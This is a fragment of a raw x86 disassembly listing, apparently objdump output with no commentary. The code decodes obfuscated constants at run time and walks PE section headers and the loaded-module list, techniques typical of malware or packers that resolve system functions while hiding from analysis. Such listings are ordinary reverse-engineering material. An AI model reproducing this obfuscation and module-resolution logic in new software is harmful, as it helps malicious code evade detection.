  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
